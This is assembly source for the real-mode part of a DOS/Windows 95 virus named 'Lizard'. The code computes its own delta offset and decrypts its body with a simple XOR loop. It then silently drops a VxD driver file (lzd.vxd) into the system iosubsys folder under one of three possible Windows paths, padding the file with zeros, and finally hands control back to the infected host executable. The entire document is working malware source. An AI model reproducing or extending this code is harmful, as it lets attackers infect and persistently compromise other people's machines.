   ;---[RMLZD.ASM]---------------------------------------------------------------

   ;Lizard's real mode portion

   .286

   vxdhsize equ 701
   vxddsize equ 81
   vxdcsize equ 880
   esize equ encend - encstart
   rmsize equ rmend - rmstart

   .model tiny

   .code
   org 100h
   start:
   rmstart:
   ;get delta
   ;-----------------------------------------------------------------------------
   call $ + 3
   drazil:
   pop si
   sub si,offset drazil
   push si
   pop bp
   ;-----------------------------------------------------------------------------
   push ds ;coz psp

   push cs
   pop ds

   ;decrypt it
   db 176  ;mov al
   encval db 0
   ;-----------------------------------------------------------------------------
   lea di,[bp + offset encstart]
   mov cx,esize
   xd:
   jmp fj
   fj2:
   inc di
   loop xd
   jmp encstart
   fj:
   xor [di],al
   jmp fj2
   ;-----------------------------------------------------------------------------
   encstart:
   mov ax,3d00h    ;try to open lzd.vxd in
   lea dx,[bp + offset dropname1]  ;c:\windows\system\iosubsys
   int 21h
   jnc cfile   ;exit if already installed
   mov ah,3ch  ;install lzd.vxd
   xor cx,cx
   int 21h
   jnc inst

   mov ax,3d00h    ;try to open lzd.vxd in
   lea dx,[bp + offset dropname2]  ;c:\win95\system\iosubsys
   int 21h
   jnc cfile
   mov ah,3ch
   xor cx,cx
   int 21h
   jnc inst

   mov ax,3d00h    ;try to open lzd.vxd in
   lea dx,[bp + offset dropname3]  ;c:\windows.000\system\iosubsys
   int 21h
   jnc cfile
   mov ah,3ch
   xor cx,cx
   int 21h
   jc exit

   inst:
   xchg ax,bx

   mov ah,40h  ;write the header
   mov cx,vxdhsize
   lea dx,[bp + offset vxdheader]
   int 21h

   ;write some zeros
   mov cx,3400
   lzero:
   push cx
   mov ah,40h
   mov cx,1
   lea dx,[bp + zero]
   int 21h
   pop cx
   loop lzero

   mov ah,40h  ;write the data
   mov cx,vxddsize
   lea dx,[bp + offset vxddata]
   int 21h

   mov ah,40h  ;write the rmcode
   mov cx,rmsize
   lea dx,[bp + offset rmstart]
   int 21h

   ;write some more zeros
   mov cx,1732
   lzero2:
   push cx
   mov ah,40h
   mov cx,1
   lea dx,[bp + zero]
   int 21h
   pop cx
   loop lzero2

   mov ah,40h  ;write the code
   mov cx,vxdcsize
   lea dx,[bp + offset vxdcode]
   int 21h

   cfile:
   mov ah,3eh
   int 21h

   ;exe return
   exit:
   pop ax  ;psp
   add ax,11h
   dec ax
   add word ptr [bp + offset csip + 2],ax

   ;stack
   db 5    ;add ax
   sseg dw 0fff0h  ;test
   mov ss,ax

   db 0bch ;mov sp
   ssp dw 0fffeh

   db 0eah
   csip dd 0fff00000h

   zero db 0

   dropname1 db 'c:\windows\system\iosubsys\lzd.vxd',0
   dropname2 db 'c:\win95\system\iosubsys\lzd.vxd',0
   dropname3 db 'c:\windows.000\system\iosubsys\lzd.vxd',0
   rmend:
   vxdheader db vxdhsize dup (?)
   vxddata db vxddsize dup (?)
   vxdcode db vxdcsize dup (?)
   encend:
   ends
   end start
